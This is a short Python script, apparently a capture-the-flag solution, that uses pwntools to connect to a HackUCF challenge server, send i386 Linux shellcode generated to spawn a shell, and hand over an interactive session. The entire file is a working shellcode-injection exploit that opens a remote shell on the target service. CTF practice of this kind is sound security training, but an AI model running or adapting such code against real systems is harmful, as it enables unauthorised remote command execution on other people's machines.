from pwn import *

def main():
    context(arch="i386",os="linux")
    r = remote("ctf.hackucf.org",10103)
    sh = asm(shellcraft.sh())
    r.sendline(sh)
    r.interactive()


if __name__ == "__main__":
    main()
